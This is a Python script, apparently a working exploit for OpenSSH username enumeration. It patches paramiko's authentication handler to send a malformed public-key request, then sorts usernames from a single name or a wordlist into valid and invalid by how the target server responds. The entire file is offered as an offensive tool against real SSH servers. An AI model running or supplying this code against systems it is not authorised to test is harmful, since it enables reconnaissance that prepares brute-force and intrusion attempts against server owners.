#!/usr/bin/env python2

import argparse
import logging
import paramiko
import socket
import sys
from colorama import init, Fore
from threading import Thread, current_thread, enumerate as enumerate_threads

class SSHUserChecker:
    def __init__(self, target, port=22):
        self.target = target
        self.port = port

        # Remove paramiko logging
        logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

        # Assign functions to respective handlers
        self._old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = self._service_accept
        paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = self._invalid_username

    def _service_accept(self, *args, **kwargs):
        paramiko.message.Message.add_boolean = self._add_boolean
        return self._old_service_accept(*args, **kwargs)

    def _add_boolean(self, *args, **kwargs):
        pass

    def _invalid_username(self, *args, **kwargs):
        raise InvalidUsername()

    def check_user(self, username):
        sock = socket.socket()
        sock.connect((self.target, self.port))
        transport = paramiko.transport.Transport(sock)

        try:
            transport.start_client()
        except paramiko.ssh_exception.SSHException:
            print (Fore.RED + '\n[!] Failed to negotiate SSH transport for user:' + username)
            return False

        try:
            transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
        except InvalidUsername:
            return False
        except paramiko.ssh_exception.AuthenticationException:
            return True
        return False

class InvalidUsername(Exception):
    pass

def check_user_wrapper(user_checker, username, valid_users, invalid_users):
    if user_checker.check_user(username):
        valid_users.append(username)
    else:
        invalid_users.append(username)

def main():
    parser = argparse.ArgumentParser(description='SSH User Enumeration')
    parser.add_argument('-u', '--username', help="Username to check for validity.")
    parser.add_argument('-w', '--wordlist', help="Wordlist file containing usernames to check.")
    parser.add_argument('-p', '--port', type=int, default=22, help="Set port of SSH service")
    parser.add_argument('target', help="IP address of the target system")

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    args = parser.parse_args()

    user_checker = SSHUserChecker(args.target, args.port)
    valid_users = []
    invalid_users = []

    if args.wordlist:
        with open(args.wordlist, 'r') as f:
            for line in f:
                username = line.strip()
                t = Thread(target=check_user_wrapper, args=(user_checker, username, valid_users, invalid_users))
                t.start()
    else:
        if not args.username:
            parser.error("[!] You must specify either a username (-u) or a wordlist (-w).")
        else:
            t = Thread(target=check_user_wrapper, args=(user_checker, args.username, valid_users, invalid_users))
            t.start()

    # Esperar a que todos los hilos terminen
    for t in enumerate_threads():
        if t != current_thread():
            t.join()

    if args.wordlist:
        if valid_users:
            print(Fore.GREEN + "\n[+] Valid users:")
            for user in valid_users:
                print(Fore.GREEN + "{}".format(user))
        else:
            print(Fore.RED + "\n[-] No valid users found.")
    else:
        if valid_users:
            print(Fore.GREEN + "\n[+] Valid user: {}".format(args.username))
        else:
            print(Fore.RED + "\n[-] Invalid user: {}".format(args.username))

if __name__ == "__main__":
    main()
